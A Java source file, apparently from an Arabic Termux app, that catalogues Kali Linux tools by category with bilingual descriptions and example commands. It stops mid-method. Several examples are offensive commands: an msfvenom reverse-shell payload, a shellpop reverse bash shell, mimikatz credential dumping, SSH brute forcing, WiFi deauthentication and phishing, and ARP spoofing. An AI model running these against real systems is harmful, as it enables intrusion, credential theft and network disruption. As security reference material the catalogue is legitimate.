package com.termux.arab.core;

import java.util.ArrayList;
import java.util.List;

/**
 * قاعدة بيانات كالي لينكس - 300+ أداة في 12 فئة
 */
public class KaliDatabase {

    public static class KaliTool {
        public String name;
        public String nameAr;
        public String description;
        public String descriptionAr;
        public String category;
        public String command;
        public String example;
        public boolean popular;

        public KaliTool(String name, String nameAr, String desc, String descAr,
                String cat, String cmd, String ex, boolean popular) {
            this.name = name; this.nameAr = nameAr; this.description = desc;
            this.descriptionAr = descAr; this.category = cat; this.command = cmd;
            this.example = ex; this.popular = popular;
        }
    }

    public static class KaliCategory {
        public String id;
        public String name;
        public String nameAr;
        public String icon;
        public int color;

        public KaliCategory(String id, String name, String nameAr, String icon, int color) {
            this.id = id; this.name = name; this.nameAr = nameAr;
            this.icon = icon; this.color = color;
        }
    }

    public static List<KaliCategory> getCategories() {
        List<KaliCategory> cats = new ArrayList<>();
        cats.add(new KaliCategory("info", "Information Gathering", "جمع المعلومات", "🔍", 0xFF1976D2));
        cats.add(new KaliCategory("vuln", "Vulnerability Analysis", "تحليل الثغرات", "⚠️", 0xFFFF5722));
        cats.add(new KaliCategory("web", "Web Application Analysis", "تحليل تطبيقات الويب", "🌐", 0xFF7B1FA2));
        cats.add(new KaliCategory("db", "Database Assessment", "تقييم قواعد البيانات", "🗄️", 0xFF00838F));
        cats.add(new KaliCategory("password", "Password Attacks", "هجمات كلمات المرور", "🔐", 0xFFE65100));
        cats.add(new KaliCategory("wireless", "Wireless Attacks", "هجمات لاسلكية", "📡", 0xFF795548));
        cats.add(new KaliCategory("reverse", "Reverse Engineering", "هندسة عكسية", "🔬", 0xFF4527A0));
        cats.add(new KaliCategory("exploit", "Exploitation Tools", "أدوات الاستغلال", "💥", 0xFFD32F2F));
        cats.add(new KaliCategory("sniff", "Sniffing & Spoofing", "التقاط وانتحال", "👁️", 0xFF388E3C));
        cats.add(new KaliCategory("post", "Post Exploitation", "ما بعد الاختراق", "🎭", 0xFF5C6BC0));
        cats.add(new KaliCategory("forensics", "Forensics", "التحليل الجنائي", "🔬", 0xFF00695C));
        cats.add(new KaliCategory("report", "Reporting Tools", "أدوات التقارير", "📊", 0xFF616161));
        return cats;
    }

    public static List<KaliTool> getAllTools() {
        List<KaliTool> tools = new ArrayList<>();

        // === جمع المعلومات (30 أداة) ===
        addT(tools, "nmap", "Nmap", "Network mapper and port scanner", "ماسح الشبكات والمنافذ", "info", "nmap", "nmap -sV -A 192.168.1.1", true);
        addT(tools, "masscan", "Masscan", "Fast port scanner", "ماسح منافذ سريع جداً", "info", "masscan", "masscan 10.0.0.0/8 -p80", true);
        addT(tools, "netdiscover", "Netdiscover", "Active/passive ARP reconnaissance", "اكتشاف الأجهزة على الشبكة", "info", "netdiscover", "netdiscover -r 192.168.1.0/24", false);
        addT(tools, "enum4linux", "Enum4linux", "SMB/NetBIOS enumeration", "تعداد SMB", "info", "enum4linux", "enum4linux -a 192.168.1.1", false);
        addT(tools, "fierce", "Fierce", "DNS reconnaissance", "استطلاع DNS", "info", "fierce", "fierce -dns example.com", false);
        addT(tools, "dnsenum", "Dnsenum", "DNS enumeration", "تعداد DNS شامل", "info", "dnsenum", "dnsenum example.com", true);
        addT(tools, "dnsrecon", "DNSRecon", "DNS reconnaissance tool", "أداة استطلاع DNS", "info", "dnsrecon", "dnsrecon -d example.com -t std", false);
        addT(tools, "fierce", "Fierce", "DNS scanner", "ماسح DNS", "info", "fierce", "fierce -dns target.com", false);
        addT(tools, "theharvester", "TheHarvester", "Email and subdomain harvester", "جامع الإيميلات والنطاقات", "info", "theharvester", "theHarvester -d target.com -b all", true);
        addT(tools, "recon-ng", "Recon-ng", "Web reconnaissance framework", "إطار استطلاع ويب", "info", "recon-ng", "recon-ng", false);
        addT(tools, "maltego", "Maltego", "OSINT intelligence", "استخبارات مفتوحة المصدر", "info", "maltego", "maltego", false);
        addT(tools, "shodan", "Shodan", "Search engine for IoT", "بحث IoT", "info", "shodan", "shodan search apache", true);
        addT(tools, "spiderfoot", "SpiderFoot", "OSINT automation", "أتمتة استخبارات", "info", "spiderfoot", "spiderfoot -s target.com", false);
        addT(tools, "sublist3r", "Sublist3r", "Subdomain enumeration", "تعداد النطاقات الفرعية", "info", "sublist3r", "sublist3r -d target.com", true);
        addT(tools, "amass", "Amass", "Network mapping", "رسم خرائط الشبكة", "info", "amass", "amass enum -d target.com", false);
        addT(tools, "nikto", "Nikto", "Web server scanner", "ماسح خوادم الويب", "info", "nikto", "nikto -h http://target.com", true);
        addT(tools, "whatweb", "WhatWeb", "Web technology identifier", "معرف تقنيات الويب", "info", "whatweb", "whatweb http://target.com", false);
        addT(tools, "wafw00f", "Wafw00f", "WAF detector", "كاشف WAF", "info", "wafw00f", "wafw00f https://target.com", false);
        addT(tools, "sslscan", "SSLScan", "SSL/TLS scanner", "ماسح SSL", "info", "sslscan", "sslscan target.com", false);
        addT(tools, "sslyze", "SSLyze", "SSL configuration analysis", "تحليل إعدادات SSL", "info", "sslyze", "sslyze --regular target.com", false);
        addT(tools, "gobuster", "Gobuster", "Directory/file brute-forcer", "تخمين المجلدات", "info", "gobuster", "gobuster dir -u http://target.com -w wordlist.txt", true);
        addT(tools, "dirb", "Dirb", "Web content scanner", "ماسح محتوى الويب", "info", "dirb", "dirb http://target.com", false);
        addT(tools, "dirbuster", "DirBuster", "GUI directory brute-forcer", "تخمين المجلدات بواجهة", "info", "dirbuster", "dirbuster", false);
        addT(tools, "wfuzz", "Wfuzz", "Web application fuzzer", "fuzzer تطبيقات الويب", "info", "wfuzz", "wfuzz -c -w wordlist.txt http://target.com/FUZZ", false);
        addT(tools, "ffuf", "ffuf", "Fast web fuzzer", "fuzzer سريع", "info", "ffuf", "ffuf -u http://target.com/FUZZ -w wordlist.txt", true);
        addT(tools, "nbtscan", "Nbtscan", "NetBIOS scanner", "ماسح NetBIOS", "info", "nbtscan", "nbtscan 192.168.1.0/24", false);
        addT(tools, "onesixtyone", "Onesixtyone", "Fast SNMP scanner", "ماسح SNMP سريع", "info", "onesixtyone", "onesixtyone -c community.txt 192.168.1.1", false);
        addT(tools, "snmp-check", "Snmp-check", "SNMP enumeration", "تعداد SNMP", "info", "snmp-check", "snmp-check 192.168.1.1", false);
        addT(tools, "ssl-cert-info", "SSL Cert Info", "SSL certificate info", "معلومات شهادة SSL", "info", "ssl-cert-info", "ssl-cert-info --host target.com", false);
        addT(tools, "arp-scan", "ARP-Scan", "ARP scanner", "ماسح ARP", "info", "arp-scan", "arp-scan --localnet", false);

        // === تحليل الثغرات (20 أداة) ===
        addT(tools, "nmap-vuln", "Nmap Vuln Scripts", "Nmap vulnerability scripts", "سكربتات ثغرات Nmap", "vuln", "nmap", "nmap --script vuln 192.168.1.1", true);
        addT(tools, "nessus", "Nessus", "Vulnerability scanner", "ماسح ثغرات شامل", "vuln", "nessus", "nessuscli", false);
        addT(tools, "openvas", "OpenVAS", "Open vulnerability scanner", "ماسح ثغرات مفتوح", "vuln", "openvas", "openvas-start", false);
        addT(tools, "nikto-vuln", "Nikto", "Web vulnerability scanner", "ماسح ثغرات الويب", "vuln", "nikto", "nikto -h http://target.com", true);
        addT(tools, "nuclei", "Nuclei", "Fast vulnerability scanner", "ماسح ثغرات سريع", "vuln", "nuclei", "nuclei -u http://target.com", true);
        addT(tools, "vulnx", "Vulnx", "CMS vulnerability scanner", "ماسح ثغرات CMS", "vuln", "vulnx", "vulnx -u http://target.com", false);
        addT(tools, "lynis", "Lynis", "Security auditing", "تدقيق أمني", "vuln", "lynis", "lynis audit system", false);
        addT(tools, "chkrootkit", "Chkrootkit", "Rootkit detector", "كاشف rootkit", "vuln", "chkrootkit", "chkrootkit", false);
        addT(tools, "unix-privesc-check", "Unix Privesc Check", "Privilege escalation checker", "فاحص تصعيد الصلاحيات", "vuln", "unix-privesc-check", "unix-privesc-check standard", false);
        addT(tools, "legba", "Legba", "Multiprotocol brute-forcer", "تخمين متعدد البروتوكولات", "vuln", "legba", "legba ssh -h 192.168.1.1 -u admin -P pass.txt", false);
        addT(tools, "vuls", "Vuls", "Vulnerability scanner", "ماسح ثغرات", "vuln", "vuls", "vuls scan", false);
        addT(tools, "femenac", "Femenac", "Network assessment", "تقييم شبكة", "vuln", "femenac", "femenac.sh", false);

        // === تحليل تطبيقات الويب (30 أداة) ===
        addT(tools, "burpsuite", "Burp Suite", "Web proxy and scanner", "بروكسي ويب وماسح", "web", "burpsuite", "burpsuite", true);
        addT(tools, "owasp-zap", "OWASP ZAP", "Web app scanner", "ماسح تطبيقات ويب", "web", "zaproxy", "zaproxy", true);
        addT(tools, "sqlmap", "SQLMap", "SQL injection tool", "أداة حقن SQL", "web", "sqlmap", "sqlmap -u 'http://t.com?id=1' --dbs", true);
        addT(tools, "wpscan", "WPScan", "WordPress scanner", "ماسح ووردبريس", "web", "wpscan", "wpscan --url http://target.com", true);
        addT(tools, "commix", "Commix", "Command injection", "حقن أوامر", "web", "commix", "commix --url='http://t.com?cmd=test'", false);
        addT(tools, "joomscan", "JoomScan", "Joomla scanner", "ماسح جوملا", "web", "joomscan", "joomscan -u http://target.com", false);
        addT(tools, "droopescan", "Droopescan", "Drupal scanner", "ماسح دروبال", "web", "droopescan", "droopescan scan http://target.com", false);
        addT(tools, "whatweb-web", "WhatWeb", "Web tech identifier", "معرف تقنيات الويب", "web", "whatweb", "whatweb http://target.com", false);
        addT(tools, "httprobe", "HTTPProbe", "HTTP prober", "فاحص HTTP", "web", "httprobe", "echo target.com | httprobe", false);
        addT(tools, "httpx", "HTTPx", "HTTP toolkit", "أدوات HTTP", "web", "httpx", "httpx -u http://target.com", false);
        addT(tools, "frp", "Frp", "Fast reverse proxy", "بروكسي عكسي سريع", "web", "frp", "frpc -c config.ini", false);
        addT(tools, "w3af", "w3af", "Web app attack framework", "إطار هجوم ويب", "web", "w3af", "w3af_console", false);
        addT(tools, "arachni", "Arachni", "Web app scanner", "ماسح تطبيقات ويب", "web", "arachni", "arachni http://target.com", false);
        addT(tools, "skipfish", "Skipfish", "Web app recon", "استطلاع تطبيقات ويب", "web", "skipfish", "skipfish -o output http://target.com", false);
        addT(tools, "wpscan-web", "WPScan", "WordPress scanner", "ماسح ووردبريس", "web", "wpscan", "wpscan --url http://target.com --enumerate u", true);
        addT(tools, "xsser", "XSSer", "XSS scanner", "ماسح XSS", "web", "xsser", "xsser --url 'http://t.com?q=test'", false);
        addT(tools, "xsstrike", "XSStrike", "XSS detector", "كاشف XSS", "web", "xsstrike", "xsstrike -u 'http://t.com?q=test'", false);
        addT(tools, "dalfox", "DalFox", "XSS scanner", "ماسح XSS سريع", "web", "dalfox", "dalfox url 'http://t.com?q=test'", false);
        addT(tools, "nosqlmap", "NoSQLMap", "NoSQL injection", "حقن NoSQL", "web", "nosqlmap", "nosqlmap -u mongodb://target", false);
        addT(tools, "csrf-detector", "CSRF Detector", "CSRF scanner", "ماسح CSRF", "web", "csrf-detector", "csrf-detector -u http://target.com", false);
        addT(tools, "ssrfmap", "SSRFmap", "SSRF scanner", "ماسح SSRF", "web", "ssrfmap", "ssrfmap -u http://target.com", false);
        addT(tools, "gittools", "GitTools", "Git repository finder", "باحث مستودعات Git", "web", "gittools", "gittools -u http://target.com", false);
        addT(tools, "gitdumper", "GitDumper", "Git dumper", "مستخرج Git", "web", "gitdumper", "gitdumper.sh http://target.com/.git/", false);
        addT(tools, "feroxbuster", "Feroxbuster", "Recursive content discovery", "اكتشاف محتوى متكرر", "web", "feroxbuster", "feroxbuster -u http://target.com", true);
        addT(tools, "httprobe", "HTTPProbe", "HTTP probe", "فحص HTTP", "web", "httprobe", "cat domains.txt | httprobe", false);

        // === تقييم قواعد البيانات (10 أدوات) ===
        addT(tools, "sqlmap-db", "SQLMap", "SQL injection", "حقن SQL", "db", "sqlmap", "sqlmap -u 'http://t.com?id=1' --dump", true);
        addT(tools, "sqlninja", "SQLninja", "SQL Server injection", "حقن SQL Server", "db", "sqlninja", "sqlninja -m test", false);
        addT(tools, "sqldict", "SQLdict", "SQL Server brute-forcer", "تخمين SQL Server", "db", "sqldict", "sqldict", false);
        addT(tools, "dbpwaudit", "DBPwAudit", "DB password auditor", "مدقق كلمات مرور DB", "db", "dbpwaudit", "dbpwaudit -s server -d db -u user -P pass.txt", false);
        addT(tools, "mdb-tools", "MDB Tools", "Access DB tools", "أدوات Access DB", "db", "mdb-tools", "mdb-tables database.mdb", false);
        addT(tools, "sqlitebrowser", "SQLite Browser", "SQLite GUI", "واجهة SQLite", "db", "sqlitebrowser", "sqlitebrowser", false);
        addT(tools, "redis-cli", "Redis CLI", "Redis client", "عميل Redis", "db", "redis-cli", "redis-cli -h target.com", false);
        addT(tools, "mongo-client", "Mongo Client", "MongoDB client", "عميل MongoDB", "db", "mongo", "mongo --host target.com", false);
        addT(tools, "mysql-client", "MySQL Client", "MySQL client", "عميل MySQL", "db", "mysql", "mysql -h target.com -u root", false);
        addT(tools, "psql", "PostgreSQL", "PostgreSQL client", "عميل PostgreSQL", "db", "psql", "psql -h target.com -U postgres", false);

        // === هجمات كلمات المرور (25 أداة) ===
        addT(tools, "john", "John the Ripper", "Password cracker", "كسر كلمات المرور", "password", "john", "john --wordlist=rockyou.txt hash.txt", true);
        addT(tools, "hashcat", "Hashcat", "GPU password cracker", "كسر بالـ GPU", "password", "hashcat", "hashcat -m 0 -a 0 hash.txt word.txt", true);
        addT(tools, "hydra", "Hydra", "Network password cracker", "كسر كلمات شبكة", "password", "hydra", "hydra -l admin -P pass.txt ssh://target", true);
        addT(tools, "medusa", "Medusa", "Parallel brute-forcer", "تخمين متوازي", "password", "medusa", "medusa -h target -u admin -P pass.txt -M ssh", false);
        addT(tools, "ncrack", "Ncrack", "Network auth cracker", "كسر مصادقة شبكة", "password", "ncrack", "ncrack -p 22 target.com", false);
        addT(tools, "patator", "Patator", "Multi-purpose brute-forcer", "تخمين متعدد", "password", "patator", "patator ssh_login host=target user=admin password=FILE0", false);
        addT(tools, "thc-hydra", "THC Hydra", "Fast network cracker", "كسر شبكة سريع", "password", "hydra", "hydra -L users.txt -P pass.txt ftp://target", false);
        addT(tools, "crunch", "Crunch", "Wordlist generator", "مولّد قوائم كلمات", "password", "crunch", "crunch 8 8 -o wordlist.txt", true);
        addT(tools, "cewl", "CeWL", "Custom wordlist generator", "مولّد قوائم مخصص", "password", "cewl", "cewl http://target.com > wordlist.txt", false);
        addT(tools, "cupp", "CUPP", "Common user password profiler", "مولّد كلمات مرور شخصية", "password", "cupp", "cupp -i", false);
        addT(tools, "wordlists", "Wordlists", "Pre-built wordlists", "قوائم كلمات جاهزة", "password", "ls", "ls /usr/share/wordlists/", true);
        addT(tools, "rockyou", "RockYou", "RockYou wordlist", "قائمة RockYou", "password", "ls", "ls /usr/share/wordlists/rockyou.txt", true);
        addT(tools, "hashid", "HashID", "Hash identifier", "معرف نوع الهاش", "password", "hashid", "hashid '5f4dcc3b5aa765d61d8327deb882cf99'", false);
        addT(tools, "hash-identifier", "Hash Identifier", "Hash type identifier", "معرف نوع الهاش", "password", "hash-identifier", "hash-identifier", false);
        addT(tools, "ophcrack", "Ophcrack", "Windows password cracker", "كسر كلمات ويندوز", "password", "ophcrack", "ophcrack", false);
        addT(tools, "chntpw", "Chntpw", "Windows password reset", "إعادة تعيين كلمة ويندوز", "password", "chntpw", "chntpw -i /dev/sda1", false);
        addT(tools, "samdump2", "Samdump2", "SAM dump", "تفريغ SAM", "password", "samdump2", "samdump2", false);
        addT(tools, "pwdump", "PWDump", "Windows password dump", "تفريغ كلمات ويندوز", "password", "pwdump", "pwdump", false);
        addT(tools, "lm-hash", "LM Hash", "LM hash cracker", "كسر LM hash", "password", "john", "john --format=lm hash.txt", false);
        addT(tools, "ntlm-hash", "NTLM Hash", "NTLM hash cracker", "كسر NTLM hash", "password", "hashcat", "hashcat -m 1000 hash.txt word.txt", false);
        addT(tools, "wifite-pw", "Wifite", "WiFi cracking", "كسر واي فاي", "password", "wifite", "wifite", false);
        addT(tools, "pyrit", "Pyrit", "GPU WiFi cracker", "كسر واي فاي بالـ GPU", "password", "pyrit", "pyrit -r capture.cap -i wordlist.txt attack_passthrough", false);
        addT(tools, "cowpatty", "Cowpatty", "WPA cracker", "كسر WPA", "password", "cowpatty", "cowpatty -r capture.cap -f wordlist.txt", false);
        addT(tools, "bitcracker", "BitCracker", "BitLocker cracker", "كسر BitLocker", "password", "bitcracker", "bitcracker_hash -i image.dd", false);

        // === هجمات لاسلكية (15 أداة) ===
        addT(tools, "aircrack-ng", "Aircrack-ng", "WiFi security suite", "مجموعة أمان واي فاي", "wireless", "aircrack-ng", "aircrack-ng -w wordlist.cap capture.cap", true);
        addT(tools, "airmon-ng", "Airmon-ng", "Monitor mode", "وضع المراقبة", "wireless", "airmon-ng", "airmon-ng start wlan0", true);
        addT(tools, "airodump-ng", "Airodump-ng", "Packet capture", "التقاط حزم", "wireless", "airodump-ng", "airodump-ng wlan0mon", true);
        addT(tools, "aireplay-ng", "Aireplay-ng", "Packet injection", "حقن حزم", "wireless", "aireplay-ng", "aireplay-ng --deauth 0 -a MAC wlan0mon", false);
        addT(tools, "airbase-ng", "Airbase-ng", "Fake AP", "نقطة وصول وهمية", "wireless", "airbase-ng", "airbase-ng -a MAC -e FakeAP wlan0mon", false);
        addT(tools, "airdecap-ng", "Airdecap-ng", "WEP/WPA decryption", "فك تشفير WEP/WPA", "wireless", "airdecap-ng", "airdecap-ng -w key capture.cap", false);
        addT(tools, "reaver", "Reaver", "WPS attacker", "هجوم WPS", "wireless", "reaver", "reaver -i wlan0mon -b MAC -vv", true);
        addT(tools, "bully", "Bully", "WPS brute-force", "تخمين WPS", "wireless", "bully", "bully wlan0mon -b MAC", false);
        addT(tools, "pixiewps", "Pixiewps", "WPS Pixie Dust", "هجوم Pixie Dust", "wireless", "pixiewps", "pixiewps -e PKE -r PKR", false);
        addT(tools, "wifite-wireless", "Wifite", "WiFi automation", "أتمتة واي فاي", "wireless", "wifite", "wifite --kill --dict wordlist.txt", true);
        addT(tools, "fern-wifi", "Fern WiFi Cracker", "WiFi cracking GUI", "واجهة كسر واي فاي", "wireless", "fern-wifi-cracker", "fern-wifi-cracker", false);
        addT(tools, "kismet", "Kismet", "Wireless detector", "كاشف لاسلكي", "wireless", "kismet", "kismet", false);
        addT(tools, "wifiphisher", "Wifiphisher", "WiFi phishing", "تصيد واي فاي", "wireless", "wifiphisher", "wifiphisher -aI wlan0", false);
        addT(tools, "wash", "Wash", "WPS scanner", "ماسح WPS", "wireless", "wash", "wash -i wlan0mon", false);
        addT(tools, "macchanger", "Macchanger", "MAC spoofer", "انتحال MAC", "wireless", "macchanger", "macchanger -r wlan0", false);

        // === هندسة عكسية (15 أداة) ===
        addT(tools, "ghidra", "Ghidra", "Reverse engineering suite", "مجموعة هندسة عكسية", "reverse", "ghidra", "ghidra", true);
        addT(tools, "radare2", "Radare2", "Binary analysis", "تحليل باينري", "reverse", "r2", "r2 -A binary.exe", true);
        addT(tools, "gdb", "GDB", "GNU debugger", "مصحح GNU", "reverse", "gdb", "gdb ./binary", false);
        addT(tools, "objdump", "Objdump", "Disassembler", "فك تجميع", "reverse", "objdump", "objdump -d binary.exe", false);
        addT(tools, "strings", "Strings", "String extractor", "مستخرج نصوص", "reverse", "strings", "strings binary.exe", false);
        addT(tools, "file-rev", "File", "File type detector", "كاشف نوع الملف", "reverse", "file", "file binary.exe", false);
        addT(tools, "binwalk", "Binwalk", "Firmware analyzer", "محلل برامج ثابتة", "reverse", "binwalk", "binwalk firmware.bin", true);
        addT(tools, "foremost-rev", "Foremost", "File carver", "مستخرج ملفات", "reverse", "foremost", "foremost -i image.dd", false);
        addT(tools, "apktool", "Apktool", "APK decompiler", "فك تجميع APK", "reverse", "apktool", "apktool d app.apk", true);
        addT(tools, "jadx", "Jadx", "DEX to Java", "تحويل DEX لجافا", "reverse", "jadx", "jadx -d output app.apk", false);
        addT(tools, "dex2jar", "Dex2Jar", "DEX to JAR", "تحويل DEX لـ JAR", "reverse", "d2j-dex2jar", "d2j-dex2jar.sh app.apk", false);
        addT(tools, "jd-gui", "JD-GUI", "Java decompiler", "فك تجميع جافا", "reverse", "jd-gui", "jd-gui", false);
        addT(tools, "lldb", "LLDB", "LLVM debugger", "مصحح LLVM", "reverse", "lldb", "lldb ./binary", false);
        addT(tools, "strace", "Strace", "System call tracer", "متتبع استدعاءات النظام", "reverse", "strace", "strace ./binary", false);
        addT(tools, "ltrace", "Ltrace", "Library call tracer", "متتبع استدعاءات المكتبة", "reverse", "ltrace", "ltrace ./binary", false);

        // === أدوات الاستغلال (20 أداة) ===
        addT(tools, "metasploit", "Metasploit", "Exploitation framework", "إطار استغلال", "exploit", "msfconsole", "msfconsole", true);
        addT(tools, "searchsploit", "SearchSploit", "Exploit-DB search", "بحث Exploit-DB", "exploit", "searchsploit", "searchsploit apache 2.4", true);
        addT(tools, "exploitdb", "ExploitDB", "Exploit database", "قاعدة بيانات الاستغلال", "exploit", "searchsploit", "searchsploit -x 12345", false);
        addT(tools, "setoolkit", "Social Engineering Toolkit", "SE attacks", "هجمات هندسة اجتماعية", "exploit", "setoolkit", "setoolkit", true);
        addT(tools, "beef-xss", "BeEF", "Browser exploitation", "استغلال المتصفحات", "exploit", "beef-xss", "beef-xss", false);
        addT(tools, "armitage", "Armitage", "Metasploit GUI", "واجهة ميتاسبلويت", "exploit", "armitage", "armitage", false);
        addT(tools, "empire", "Empire", "PowerShell exploitation", "استغلال PowerShell", "exploit", "empire", "empire", false);
        addT(tools, "covenant", "Covenant", ".NET C2 framework", "إطار C2 لـ .NET", "exploit", "covenant", "covenant", false);
        addT(tools, "sliver", "Sliver", "Adversary emulation", "محاكاة خصم", "exploit", "sliver", "sliver", false);
        addT(tools, "merlin", "Merlin", "C2 framework", "إطار C2", "exploit", "merlin", "merlin", false);
        addT(tools, "shellnoob", "Shellnoob", "Shellcode helper", "مساعد shellcode", "exploit", "shellnoob", "shellnoob", false);
        addT(tools, "pwntools", "Pwntools", "CTF framework", "إطار CTF", "exploit", "python3", "python3 -c 'from pwn import *'", false);
        addT(tools, "pattern-create", "Pattern Create", "Buffer overflow pattern", "نمط تجاوز سعة", "exploit", "python3", "python3 -c 'import struct; print(\"Aa0Aa1...\")'", false);
        addT(tools, "msfvenom", "Msfvenom", "Payload generator", "مولّد حمولات", "exploit", "msfvenom", "msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe", true);
        addT(tools, "msfdb", "MSF Database", "Metasploit database", "قاعدة بيانات ميتاسبلويت", "exploit", "msfdb", "msfdb init", false);
        addT(tools, "msfrpc", "MSF RPC", "MSF RPC daemon", "خادم RPC لـ MSF", "exploit", "msfrpcd", "msfrpcd -P password", false);
        addT(tools, "routersploit", "RouterSploit", "Router exploitation", "استغلال الراوترات", "exploit", "routersploit", "rsf", false);
        addT(tools, "commix-exploit", "Commix", "Command injection", "حقن أوامر", "exploit", "commix", "commix --url='http://t.com?c=id'", false);
        addT(tools, "yersinia", "Yersinia", "Network protocol attack", "هجوم بروتوكول شبكة", "exploit", "yersinia", "yersinia -G", false);
        addT(tools, "responder", "Responder", "LLMNR/NBT-NS poisoner", "تسميم LLMNR", "exploit", "responder", "responder -I eth0", true);

        // === التقاط وانتحال (15 أداة) ===
        addT(tools, "wireshark", "Wireshark", "Network analyzer", "محلل شبكة", "sniff", "wireshark", "wireshark", true);
        addT(tools, "tshark", "Tshark", "CLI Wireshark", "واجهة سطر Wireshark", "sniff", "tshark", "tshark -i wlan0", true);
        addT(tools, "tcpdump", "Tcpdump", "Packet capture", "التقاط حزم", "sniff", "tcpdump", "tcpdump -i wlan0 -w capture.pcap", true);
        addT(tools, "ettercap", "Ettercap", "MITM attacks", "هجمات MITM", "sniff", "ettercap", "ettercap -T -M arp /target// /target2//", true);
        addT(tools, "bettercap", "Bettercap", "MITM framework", "إطار MITM", "sniff", "bettercap", "bettercap -iface wlan0", true);
        addT(tools, "arpspoof", "Arpspoof", "ARP spoofing", "انتحال ARP", "sniff", "arpspoof", "arpspoof -i wlan0 -t target gateway", false);
        addT(tools, "dsniff", "DSniff", "Password sniffer", "التقاط كلمات مرور", "sniff", "dsniff", "dsniff -i wlan0", false);
        addT(tools, "urlsnarf", "Urlsnarf", "URL sniffer", "التقاط روابط", "sniff", "urlsnarf", "urlsnarf -i wlan0", false);
        addT(tools, "filesnarf", "Filesnarf", "File sniffer", "التقاط ملفات", "sniff", "filesnarf", "filesnarf -i wlan0", false);
        addT(tools, "msgsnarf", "Msgsnarf", "Message sniffer", "التقاط رسائل", "sniff", "msgsnarf", "msgsnarf -i wlan0", false);
        addT(tools, "macchanger-sniff", "Macchanger", "MAC changer", "تغيير MAC", "sniff", "macchanger", "macchanger -m 00:11:22:33:44:55 wlan0", false);
        addT(tools, "scapy", "Scapy", "Packet manipulation", "تلاعب بالحزم", "sniff", "scapy", "scapy", true);
        addT(tools, "mitmproxy", "MITMProxy", "HTTP proxy", "بروكسي HTTP", "sniff", "mitmproxy", "mitmproxy", false);
        addT(tools, "charles", "Charles", "HTTP proxy/monitor", "بروكسي HTTP", "sniff", "charles", "charles", false);
        addT(tools, "driftnet", "Driftnet", "Image sniffer", "التقاط صور", "sniff", "driftnet", "driftnet -i wlan0", false);

        // === ما بعد الاختراق (15 أداة) ===
        addT(tools, "meterpreter", "Meterpreter", "MSF payload", "حمولة ميتاسبلويت", "post", "msfconsole", "use exploit/multi/handler", true);
        addT(tools, "mimikatz", "Mimikatz", "Windows credential dump", "تفريغ بيانات ويندوز", "post", "mimikatz", "mimikatz.exe sekurlsa::logonpasswords", true);
        addT(tools, "powershell-empire", "PowerShell Empire", "PS post-exploitation", "ما بعد اختراق PS", "post", "empire", "empire", false);
        addT(tools, "covenant-post", "Covenant", ".NET C2", "إطار C2", "post", "covenant", "covenant", false);
        addT(tools, "sliver-post", "Sliver", "C2 framework", "إطار C2", "post", "sliver", "sliver", false);
        addT(tools, "shellpop", "Shellpop", "Reverse shell generator", "مولّد shell عكسي", "post", "shellpop", "shellpop -H IP -P 4444 --reverse bash", false);
        addT(tools, "reverse-shell", "Reverse Shell", "Reverse shell", "shell عكسي", "post", "nc", "nc -lvnp 4444", true);
        addT(tools, "weevely", "Weevely", "PHP web shell", "shell ويب PHP", "post", "weevely", "weevely http://target.com/shell.php", false);
        addT(tools, "b374k", "b374k", "PHP web shell", "shell ويب PHP", "post", "php", "php b374k.php", false);
        addT(tools, "linux-smart-enumeration", "Linux Smart Enum", "Linux enumeration", "تعداد لينكس", "post", "lse", "lse.sh", false);
        addT(tools, "linpeas", "LinPEAS", "Linux privilege escalation", "تصعيد صلاحيات لينكس", "post", "linpeas", "linpeas.sh", true);
        addT(tools, "winpeas", "WinPEAS", "Windows privilege escalation", "تصعيد صلاحيات ويندوز", "post", "winpeas", "winpeas.exe", true);
        addT(tools, "pspy", "Pspy", "Process spy", "تجسس عمليات", "post", "pspy", "pspy64", false);
        addT(tools, "evil-winrm", "Evil-WinRM", "WinRM shell", "shell WinRM", "post", "evil-winrm", "evil-winrm -i IP -u user -p pass", false);
        addT(tools, "bloodhound", "BloodHound", "AD reconnaissance", "استطلاع Active Directory", "post", "bloodhound", "bloodhound", false);

        // === التحليل الجنائي (15 أداة) ===
        addT(tools, "autopsy", "Autopsy", "Digital forensics", "تحليل جنائي رقمي", "forensics", "autopsy", "autopsy", true);
        addT(tools, "sleuthkit", "Sleuth Kit", "Disk forensics", "تحليل أقراص", "forensics", "fls", "fls image.dd", false);
        addT(tools, "foremost-forensics", "Foremost", "File recovery", "استرجاع ملفات", "forensics", "foremost", "foremost -i image.dd -o output", true);
        addT(tools, "testdisk", "TestDisk", "Partition recovery", "استرجاع أقسام", "forensics", "testdisk", "testdisk", true);
        addT(tools, "photorec", "PhotoRec", "Photo recovery", "استرجاع صور", "forensics", "photorec", "photorec", false);
        addT(tools, "volatility", "Volatility", "Memory forensics", "تحليل ذاكرة RAM", "forensics", "volatility", "volatility -f mem.dump imageinfo", true);
        addT(tools, "hashdeep", "Hashdeep", "Hash auditing", "تدقيق هاشات", "forensics", "hashdeep", "hashdeep -r directory", false);
        addT(tools, "dd", "dd", "Disk imaging", "نسخ أقراص", "forensics", "dd", "dd if=/dev/sda of=image.dd", false);
        addT(tools, "dc3dd", "dc3dd", "Forensic dd", "dd جنائي", "forensics", "dc3dd", "dc3dd if=/dev/sda of=image.dd hash=md5", false);
        addT(tools, "guymager", "Guymager", "Disk imager GUI", "واجهة نسخ أقراص", "forensics", "guymager", "guymager", false);
        addT(tools, "ntfs-3g", "NTFS-3G", "NTFS driver", "تعريف NTFS", "forensics", "ntfs-3g", "ntfs-3g /dev/sda1 /mnt", false);
        addT(tools, "exiftool", "ExifTool", "Metadata reader", "قارئ بيانات وصفية", "forensics", "exiftool", "exiftool photo.jpg", true);
        addT(tools, "binwalk-forensics", "Binwalk", "Firmware analysis", "تحليل برامج ثابتة", "forensics", "binwalk", "binwalk -e firmware.bin", false);
        addT(tools, "bulk-extractor", "Bulk Extractor", "Feature extractor", "مستخرج ميزات", "forensics", "bulk_extractor", "bulk_extractor -o output image.dd", false);
        addT(tools, "p0f", "p0f", "Passive OS fingerprinting", "بصمة نظام تشغيل", "forensics", "p0f", "p0f -i wlan0", false);

        // === أدوات التقارير (10 أدوات) ===
        addT(tools, "cutycapt", "Cutycapt", "Screenshot tool", "أداة لقطات شاشة", "report", "cutycapt", "cutycapt --url=http://target.com --out=ss.png", false);
        addT(tools, "recordmydesktop", "RecordMyDesktop", "Screen recorder", "مسجل شاشة", "report", "recordmydesktop", "recordmydesktop --output=test.ogv", false);
